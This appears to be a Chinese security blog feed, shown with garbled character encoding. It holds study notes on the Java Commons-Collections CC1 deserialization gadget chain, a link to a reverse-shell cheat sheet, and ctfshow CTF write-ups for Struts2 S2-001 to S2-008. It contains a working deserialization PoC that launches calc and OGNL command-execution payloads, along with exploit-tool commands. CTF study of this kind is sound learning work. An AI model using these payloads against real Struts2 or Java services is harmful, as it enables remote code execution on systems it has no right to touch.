ä¸ºä¸Šé¢çš„æ–¹æ³•çš„è¯æ˜¯å¯¹transformè¿›è¡Œå¾ªç¯è°ƒç”¨çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ChainedTransformerè¿›è¡Œå¾ªç¯åˆ©ç”¨,è¿™ä¸ªå‡½æ•°çš„æ„é€ å‡½æ•°æ˜¯ä¼ ä¸€ä¸ªtransformæ•°ç»„è¿›å»ï¼Œç„¶åå¯¹å…¶å¾ªç¯è°ƒç”¨</span></span><br><span class="line">        Transformer[] Transformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">                &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformer);</span><br><span class="line">        chainedTransformer.transform(Runtime.class); <span class="comment">///è¿™é‡Œçš„è¯æ˜¯åªæœ‰è¿™ä¸ªRuntimeæ˜¯ç”±æˆ‘ä»¬æ§åˆ¶çš„,è¿™é‡Œçš„è¯æ˜¯åªè°ƒç”¨ä¸€æ¬¡transform.</span></span><br><span class="line">            <span class="comment">//Method getRuntimeMethod = c.getMethod(&quot;getRuntime&quot;,null);//1</span></span><br><span class="line">            <span class="comment">//Runtime r =(Runtime) getRuntimeMethod.invoke(null,null);//2</span></span><br><span class="line">           <span class="comment">// Method execMethod = c.getMethod(&quot;exec&quot;, String[].class);//3</span></span><br><span class="line">            <span class="comment">//execMethod.invoke(r,&quot;calc&quot;);//3</span></span><br><span class="line"><span class="comment">//        Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span></span><br><span class="line"><span class="comment">//        //è¿™å› ä¸ºAnnotationInvocationHandleræ²¡æœ‰å®šä¹‰ä¸ºpublicï¼Œæ‰€ä»¥ä¸èƒ½ç›´æ¥è·å–ï¼Œå¾—é€šè¿‡åå°„æ¥è¿›è¡Œè·å–</span></span><br><span class="line"><span class="comment">//        Constructor annotationInvocationConstructor = c.getDeclaredConstructor(Class.class,Map.class);</span></span><br><span class="line"><span class="comment">//        annotationInvocationConstructor.setAccessible(true);</span></span><br><span class="line"><span class="comment">//        Object o = annotationInvocationConstructor.newInstance(Override.class,transformedMap);</span></span><br><span class="line"><span class="comment">//        //ä¸Šé¢çš„é‚£ä¸ªä»£ç æ—¶æ›¿ä»£ä¸Šé¢é‚£ä¸ªforå¾ªç¯çš„setValue();  å› ä¸ºå°±æ˜¯AnnotationInvocationHandlerçš„readObjecté‡Œé¢è°ƒç”¨äº†setValue</span></span><br><span class="line"><span class="comment">//        serialize(o);</span></span><br><span class="line"><span class="comment">//        unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//1.æœ€å å¾—é‡æ–°æ  å› ä¸ºruntimeä¸èƒ½è¿›è¡Œåºåˆ—åŒ–</span></span><br><span class="line">        <span class="comment">//2.AnnotationInvocationHandleré‡Œçš„readObject()å¤„é‚£è°ƒç”¨çš„setValue()å“ªæœ‰ä¸¤ä¸ªifå¾—è¿›è¡Œç»•è¿‡</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oss</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oss.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„ä»£ç æ—¶å­¦ä¹ cc1æ—¶è°ƒè¯•çš„ä»£ç ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªå‘å°±æ˜¯å¾—å…ˆè·Ÿç€ä¸Šé¢çš„è§†é¢‘è¿›è¡Œè°ƒè¯•ï¼Œä¸ç„¶çš„è¯ä¼šå¤ç°ä¸æˆåŠŸã€‚</p><p>è¿™é‡Œçš„è¯ç”±äºè‡ªå·±æ‡’  æ‰€ä»¥ç”¨è¿™ç¯‡æ–‡ç« æ¥è¿›è¡Œå­¦ä¹    <a href="https://www.cnblogs.com/LeslieSec/p/17112646.html">æ–‡ç« </a></p><p>ï¼ˆåªæ˜¯å†™ä¸€äº›æˆ‘çœ‹çš„æ—¶å€™çš„è§è§£ï¼‰</p><p><img src="../images/image-20230308162258990.png" alt="image-20230308162258990"></p><p>è¿™é‡Œè™½ç„¶ä¼ äº†valueTransformerçš„å€¼ï¼Œä½†æ˜¯</p><p><img src="../images/image-20230308162354429.png" alt="image-20230308162354429"></p><p>è¿™ä¸ªvalueæ²¡æœ‰ä¼ ï¼Œæ‰€ä»¥è·Ÿè¿›æ–‡ç« çš„ä¸‹ä¸€æ­¥æ“ä½œã€‚</p><p><img src="../images/image-20230308163906186.png" alt="image-20230308163906186"></p><p>è¿™é‡Œä¼ transformedMapçš„åŸå› æ˜¯å› ä¸ºMapå¯æ§<img src="../images/image-20230308163951871.png" alt="image-20230308163951871"></p><p>transformedMapåœ¨è¿™é‡Œçš„æ˜¯å› ä¸ºå¾—éå†ç„¶åè§¦å‘setValue();</p><p>é‚£ä¸¤ä¸ªifç»•è¿‡çš„è§£é‡Š</p><p><img src="../images/image-20230308170126953.png" alt="image-20230308170126953"></p><p><img src="../images/image-20230308170141736.png" alt="image-20230308170141736"></p><p><code>memberValue.getValue();</code>  <code>memberTypes.get(name);</code>åœ¨mapä¿®æ”¹keyåä¸ºvalueçš„æ—¶å€™ï¼Œé‚£ä¹ˆget(name)å°±ä¼šè°ƒç”¨åˆ°Targetçš„valueä»è€Œèƒ½ç»•è¿‡åˆ¤æ–­</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">memberType.isInstance(value)  è¿™ä¸ªçš„è¯ç»•è¿‡åº”è¯¥æ˜¯å› ä¸ºconstructor.newInstance(Target.class,transformedMap);è¿™ä¸ªå®ä¾‹åŒ–å¯¹è±¡çš„æ—¶å€™ä¼ è¿›æ¥äº†Target,å¹¶ä¸”è¿™ä¸ªé‡Œé¢åˆšå¥½æœ‰value</span><br></pre></td></tr></table></figure><p><strong>poc</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//é¿å…è¢«readObjectä¿®æ”¹</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object, Object&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap  = TransformedMap.decorate(map,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//ç¬¬ä¸€ä¸ªå‚æ•°ç»§æ‰¿äº†æ³¨è§£ï¼Œæˆ‘ä»¬å…ˆç”¨overrideå°è¯•</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Target.class,transformedMap);</span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªpocé“¾å­çš„é¡ºåºå°±æ˜¯  </p><p>InvokerTransformer  â€”&gt;  transformers   â€”&gt;  transformedMap  â€”&gt;  decorate  â€”&gt;checkSetValue  â€”&gt; setValue â€”&gt;  AnnotationInvocationHandlerçš„readObject</p><p>è¿™å°±æ˜¯æ•´æ¡é“¾å­çš„é¡ºåº  é‡Œé¢æœ€é‡è¦çš„æ–¹æ³•å°±æ˜¯<strong>åå°„</strong></p><h3 id="cc6"><a href="#cc6" class="headerlink" title="cc6"></a>cc6</h3>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow javaååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åå¼¹shell</title>
      <link href="/posts/2f610211.html"/>
      <url>/posts/2f610211.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#awk">åå¼¹shellå¤§åˆé›†</a></p><p>é‡Œé¢è¿˜æœ‰å·¥å…·</p>]]></content>
      
      
      
        <tags>
            
            <tag> åå¼¹shellå¤§å…¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-JAVA åˆ·é¢˜è®°å½•</title>
      <link href="/posts/1c639bd.html"/>
      <url>/posts/1c639bd.html</url>
      
        <content type="html"><![CDATA[<p><strong>è„šæœ¬é€šæ€</strong></p><p>  <strong>WEB279-294 296-297</strong></p><p>ä»¥ä¸‹é¢˜ç›®å‚è€ƒ â€”â€”&gt; <a href="https://blog.csdn.net/q20010619/article/details/120729447">æ–‡ç« </a></p><p>å…¨éƒ¨é¢˜éƒ½æ˜¯struts2æ¡†æ¶æ¼æ´</p><p>è„šæœ¬é€šæ€ ä¸‹è½½ ä¸‹è½½é“¾æ¥ï¼š<a href="https://pan.bç±»ä¼¼/aidu.com/s/19yr0tWbG1UU_ULjEan5ttQ">https://pan.bç±»ä¼¼/aidu.com/s/19yr0tWbG1UU_ULjEan5ttQ</a> æå–ç ï¼šbn71<br>å…·ä½“ç”¨æ³•åœ¨mdæ–‡ä»¶ä¸­ï¼Œä¾‹å¦‚<br>æ£€æµ‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python Struts2Scan.py -u http://94c4c47e-4fb3-408c-97d7-56a5094f84a7.chall.ctf.show/S2-001/login.action</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python Struts2Scan.py -u http://94c4c47e-4fb3-408c-97d7-56a5094f84a7.chall.ctf.show/S2-001/login.action -n S2-001 --exec</span><br></pre></td></tr></table></figure><p><strong>æ‰§è¡Œå‘½ä»¤envå³å¯å¾—åˆ°flag</strong></p><p>Struts2æ˜¯ç”¨Javaè¯­è¨€ç¼–å†™çš„ä¸€ä¸ªåŸºäºMVCè®¾è®¡æ¨¡å¼çš„Webåº”ç”¨æ¡†æ¶</p><p>å…³äºstruts2æ¼æ´ï¼Œvulhubéƒ½æœ‰ç¯å¢ƒå¹¶ä¸”ç»™å‡ºäº†æ¼æ´åŸç†å’Œpoc</p><p>GitHubé¡¹ç›®åœ°å€ï¼š<a href="https://github.com/vulhub/vulhub/tree/master/struts2">https://github.com/vulhub/vulhub/tree/master/struts2</a></p><p><strong>åˆ¤æ–­ç½‘ç«™æ˜¯å¦åŸºäºStruts2çš„æ–¹æ³•</strong></p><p>é€šè¿‡é¡µé¢å›æ˜¾çš„é”™è¯¯æ¶ˆæ¯æ¥åˆ¤æ–­ï¼Œé¡µé¢ä¸å›æ˜¾é”™è¯¯æ¶ˆæ¯æ—¶åˆ™æ— æ•ˆ<br>é€šè¿‡ç½‘é¡µåç¼€æ¥åˆ¤æ–­ï¼Œå¦‚.do.actionï¼Œæœ‰å¯èƒ½ä¸å‡†<br>å¦‚æœé…ç½®æ–‡ä»¶ä¸­å¸¸æ•°extensionçš„å€¼ä»¥é€—å·ç»“å°¾æˆ–è€…æœ‰ç©ºå€¼ï¼ŒæŒ‡æ˜äº†actionå¯ä»¥ä¸å¸¦åç¼€ï¼Œé‚£ä¹ˆä¸å¸¦åç¼€çš„uriä¹Ÿå¯èƒ½æ˜¯struts2æ¡†æ¶æ­å»ºçš„<br>å¦‚æœä½¿ç”¨Struts2çš„restæ’ä»¶ï¼Œå…¶é»˜è®¤çš„struts-plugin.xmlæŒ‡å®šçš„è¯·æ±‚åç¼€ä¸ºxhtml,xmlå’Œjson<br>åˆ¤æ–­ /struts/webconsole.html æ˜¯å¦å­˜åœ¨æ¥è¿›è¡Œåˆ¤æ–­ï¼Œéœ€è¦ devMode ä¸º true</p><p><strong>è¿™é‡Œçš„è¯ä¹Ÿè®°å½•ä¸€ä¸‹æˆ‘å­¦ä¹ javaçš„è¿‡ç¨‹</strong></p><h2 id="web279-S2-001"><a href="#web279-S2-001" class="headerlink" title="web279-S2-001"></a>web279-S2-001</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230221220243509.png" alt="image-20230221220243509"></p><p>æ‰“å¼€æºç å‘ç°</p><p>å­˜åœ¨ä¸€ä¸ªè·¯å¾„ï¼Œç„¶åè®¿é—®å¾—åˆ°</p><p><img src="../images/image-20230221220331569.png" alt="image-20230221220331569"></p><p>s2-001æ˜¯ä¸€ä¸ªstruts2å‘½ä»¤æ‰§è¡Œæ¼æ´ç¼–å·ï¼Œè¿™ç¯‡æ–‡ç« ç»™äº†è¯¦ç»†ä»‹ç»<a href="https://www.freebuf.com/column/224041.html">é“¾æ¥</a></p><p><strong>æ¼æ´åŸç†</strong></p><blockquote><p>struts2æ¼æ´ S2-001æ˜¯å½“ç”¨æˆ·æäº¤è¡¨å•æ•°æ®ä¸”éªŒè¯å¤±è´¥æ—¶ï¼ŒæœåŠ¡å™¨ä½¿ç”¨OGNLè¡¨è¾¾å¼è§£æç”¨æˆ·å…ˆå‰æäº¤çš„å‚æ•°å€¼ï¼Œ%{value}å¹¶é‡æ–°å¡«å……ç›¸åº”çš„è¡¨å•æ•°æ®</p></blockquote><p>è¿™é‡Œçš„è¯å’Œsstiè¿˜æœ‰ç‚¹åƒï¼Œå› ä¸ºå°±æ˜¯  <strong>%{1+1}</strong>   å¯ä»¥ç”Ÿæˆ2   è¿™æ˜¯ä¸ª<strong>OGNLè¡¨è¾¾å¼</strong></p><p>è¿™é‡Œçš„è¯ä¼šå¯¹ä¸‹é¢ä¸‰ä¸ªä¸œè¥¿è¿›è¡Œè§£é‡Š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">% çš„ç”¨é€”æ˜¯åœ¨æ ‡å¿—çš„å±æ€§ä¸ºå­—ç¬¦ä¸²ç±»å‹æ—¶ï¼Œè®¡ç®—OGNLè¡¨è¾¾å¼%&#123;&#125;ä¸­çš„å€¼</span><br><span class="line"># çš„ç”¨é€”è®¿ä¸»è¦æ˜¯è®¿é—®éæ ¹å¯¹è±¡å±æ€§ï¼Œå› ä¸ºStruts 2ä¸­å€¼æ ˆè¢«è§†ä¸ºæ ¹å¯¹è±¡ï¼Œæ‰€ä»¥è®¿é—®å…¶ä»–éæ ¹å¯¹è±¡æ—¶ï¼Œéœ€è¦åŠ #å‰ç¼€æ‰å¯ä»¥è°ƒç”¨</span><br><span class="line">$ ä¸»è¦æ˜¯åœ¨Struts 2é…ç½®æ–‡ä»¶ä¸­ï¼Œå¼•ç”¨OGNLè¡¨è¾¾å¼</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è·å–tomcatè·¯å¾„</span></span><br><span class="line">%&#123;<span class="string">&quot;tomcatBinDir&#123;&quot;</span>+<span class="meta">@java</span>.lang.System<span class="meta">@getProperty(&quot;user.dir&quot;)</span>+<span class="string">&quot;&#125;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è·å–webè·¯å¾„</span></span><br><span class="line">%&#123;#req=<span class="meta">@org</span>.apache.struts2.ServletActionContext<span class="meta">@getRequest()</span>,#response=#context.get(<span class="string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>).getWriter(),#response.println(#req.getRealPath(<span class="string">&#x27;/&#x27;</span>)),#response.flush(),#response.close()&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å‘½ä»¤æ‰§è¡Œ envï¼Œflagå°±åœ¨å…¶ä¸­</span></span><br><span class="line">password=%&#123;#a=(<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String[]&#123;<span class="string">&quot;env&quot;</span>&#125;)).redirectErrorStream(<span class="literal">true</span>).start(),#b=#a.getInputStream(),#c=<span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(#b),#d=<span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(#c),#e=<span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">50000</span>],#d.read(#e),#f=#context.get(<span class="string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>),#f.getWriter().println(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;&amp;username=<span class="number">1</span></span><br><span class="line"><span class="comment">//è¿™é‡Œçš„å‘½ä»¤æ‰§è¡Œå°±æ˜¯ä¿®æ”¹envå°±è¡Œäº†ï¼Œç›¸æŸ¥å•¥å°±å»ä¿®æ”¹</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„è¯è™½ç„¶payloadçœ‹ä¸æ‡‚ä»€ä¹ˆæ„æ€ï¼Œä½†æ˜¯å¾—æŠŠé‡Œé¢ä¸€äº›ä¸œè¥¿è¿›è¡Œç ”ç©¶ç ”ç©¶</p><p><a href="https://blog.csdn.net/weixin_43748564/article/details/107375850">â€œ@â€ Javaä¸­çš„ç‰¹æ®Šç¬¦å·â€”â€”æ³¨è§£ï¼ˆJavaä¸­â€™@â€˜ç¬¦å·æ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿï¼‰</a></p><p><a href="https://blog.csdn.net/u012834750/article/details/79361552">java.langåŒ…ä»‹ç»</a></p><p><a href="https://zhuanlan.zhihu.com/p/98094713">ä¸€ç¯‡å½»åº•è¯»æ‡‚javaä¸­çš„IOæµï¼</a></p><p>ä¹Ÿå¯ä»¥åˆ©ç”¨å·¥å…·è¿›è¡Œè§£é¢˜</p><h2 id="web280-S2-005"><a href="#web280-S2-005" class="headerlink" title="web280-S2-005"></a>web280-S2-005</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230221223022301.png" alt="image-20230221223022301"></p><p><strong>æ¼æ´åŸç†</strong></p><p>å…ˆæ¥äº†è§£ä¸‹S2-003</p><p>Struts2å°†HTTPçš„æ¯ä¸ªå‚æ•°åè§£æä¸ºognlè¯­å¥æ‰§è¡Œ,è€Œognlè¡¨è¾¾å¼æ˜¯é€šè¿‡#æ¥è®¿é—®strutsçš„å¯¹è±¡ï¼ŒStruts2æ¡†æ¶è™½ç„¶è¿‡æ»¤äº†#æ¥è¿›è¡Œè¿‡æ»¤ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡unicodeç¼–ç ï¼ˆu0023ï¼‰æˆ–8è¿›åˆ¶ï¼ˆ43ï¼‰ç»•è¿‡äº†å®‰å…¨é™åˆ¶ï¼Œè¾¾åˆ°ä»£ç æ‰§è¡Œçš„æ•ˆæœ</p><p><strong>å½±å“ç‰ˆæœ¬ï¼šStruts 2.0.0 - Struts 2.0.11.2</strong></p><p>å†çœ‹S2-005ï¼Œ<a href="https://www.freebuf.com/vuls/193078.html">å‚è€ƒé“¾æ¥</a></p><p>S2-005å’ŒS2-003çš„åŸç†æ˜¯ç±»ä¼¼çš„ï¼Œå› ä¸ºå®˜æ–¹åœ¨ä¿®è¡¥S2-003ä¸å…¨é¢ï¼Œå¯¼è‡´ç”¨æˆ·å¯ä»¥ç»•è¿‡å®˜æ–¹çš„å®‰å…¨é…ç½®ï¼ˆç¦æ­¢é™æ€æ–¹æ³•è°ƒç”¨å’Œç±»æ–¹æ³•æ‰§è¡Œï¼‰ï¼Œå†æ¬¡é€ æˆçš„æ¼æ´ï¼Œå¯ä»¥è¯´æ˜¯å‡çº§ç‰ˆçš„S2-005æ˜¯å‡çº§ç‰ˆçš„S2-003</p><p><strong>å½±å“ç‰ˆæœ¬</strong>ï¼š<strong>Struts 2.0.0 - Struts 2.1.8.1</strong></p><p>è¿™é¢˜çš„è¯æ˜¯åˆ©ç”¨å·¥å…·æ¥è§£é¢˜çš„</p><p>æŸ¥æ¼æ´ </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python Struts2Scan.py -u http://d6000b7a-d2b5-47b4-<span class="number">8133</span>-e503ee337f51.challenge.ctf.show/S2-005/example/HelloWorld.action</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230221224315378.png" alt="image-20230221224315378"></p><p>åˆ©ç”¨ç½‘ä¸Šçš„å·¥å…·å¾—å‡ºç¡®å®æ˜¯å­˜åœ¨<strong>S2-005</strong>æ¼æ´</p><p>é‚£ä¹ˆç›´æ¥åˆ©ç”¨å·¥å…·æ‰“å°±è¡Œäº†ã€‚</p><p>åˆ©ç”¨æ¼æ´è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python Struts2Scan.py -u http://33f274f4-42ec-4646-a3e0-5670b693959b.challenge.ctf.show/S2-005/example/HelloWorld.action -n S2-005 --exec</span><br></pre></td></tr></table></figure><p>ç„¶åè¾“å…¥envå°±å¯ä»¥çœ‹åˆ°flagäº†ã€‚</p><p><img src="../images/image-20230222102511636.png" alt="image-20230222102511636"></p><h2 id="web281-S2-007"><a href="#web281-S2-007" class="headerlink" title="web281-S2-007"></a>web281-S2-007</h2><p><strong>æ¼æ´åŸç†</strong></p><blockquote><p>å½“é…ç½®äº†éªŒè¯è§„åˆ™ <code>&lt;ActionName&gt;-validation.xml</code> æ—¶ï¼Œè‹¥ç±»å‹éªŒè¯è½¬æ¢å‡ºé”™ï¼Œåç«¯é»˜è®¤ä¼šå°†ç”¨æˆ·æäº¤çš„è¡¨å•å€¼é€šè¿‡å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œç„¶åæ‰§è¡Œä¸€æ¬¡ OGNL è¡¨è¾¾å¼è§£æå¹¶è¿”å›</p><p><strong>å½±å“ç‰ˆæœ¬</strong>ï¼šStruts2 2.0.0 - Struts2 2.2.3</p></blockquote><p>æ‰§è¡Œä»»æ„ä»£ç poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;</span>id<span class="string">&#x27;).getInputStream())) + &#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åœ¨idå¤„ä¿®æ”¹å‘½ä»¤å°±è¡Œ</p><p><img src="../images/image-20230222103018669.png" alt="image-20230222103018669"></p><p>åœ¨ageå¤„å¯ä»¥è¿›è¡Œè¾“å‡ºã€‚</p><p>ç„¶åæŠŠidä¿®æ”¹æˆenvå°±å¯ä»¥çœ‹åˆ°flagäº†ã€‚</p><p>ç”¨å·¥å…·å…¶å®ä¹Ÿæ˜¯å¯ä»¥çš„</p><p><strong>æŸ¥æ¼æ´</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python Struts2Scan.py -u http://016b938b-1b04-<span class="number">4939</span>-bfbf-d66ff6df2ccf.challenge.ctf.show/S2-007/user.action</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230222103423727.png" alt="image-20230222103423727"></p><p>ä½†æ˜¯åˆ©ç”¨å·¥å…·æ¥çœ‹çš„è¯è¿™é‡Œä¸æ˜¯s2-007æ¼æ´ï¼Œæœ‰ç‚¹å¥‡æ€ªã€‚</p><p><img src="../images/image-20230222103701552.png" alt="image-20230222103701552"></p><h2 id="web282-S2-008"><a href="#web282-S2-008" class="headerlink" title="web282-S2-008"></a>web282-S2-008</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230222104319076.png" alt="image-20230222104319076"></p><p><strong>æ¼æ´åŸç†</strong></p><p>S2-008 æ¶‰åŠå¤šä¸ªæ¼æ´ï¼ŒCookie æ‹¦æˆªå™¨é”™è¯¯é…ç½®å¯é€ æˆ OGNL è¡¨è¾¾å¼æ‰§è¡Œï¼Œä½†æ˜¯ç”±äºå¤§å¤š Web å®¹å™¨ï¼ˆå¦‚ Tomcatï¼‰å¯¹ Cookie åç§°éƒ½æœ‰å­—ç¬¦é™åˆ¶ï¼Œä¸€äº›å…³é”®å­—ç¬¦æ— æ³•ä½¿ç”¨ä½¿å¾—è¿™ä¸ªç‚¹æ˜¾å¾—æ¯”è¾ƒé¸¡è‚‹ã€‚å¦ä¸€ä¸ªæ¯”è¾ƒé¸¡è‚‹çš„ç‚¹å°±æ˜¯åœ¨ struts2 åº”ç”¨å¼€å¯ devMode æ¨¡å¼åä¼šæœ‰å¤šä¸ªè°ƒè¯•æ¥å£èƒ½å¤Ÿç›´æ¥æŸ¥çœ‹å¯¹è±¡ä¿¡æ¯æˆ–ç›´æ¥æ‰§è¡Œå‘½ä»¤ï¼Œæ­£å¦‚ kxlzx 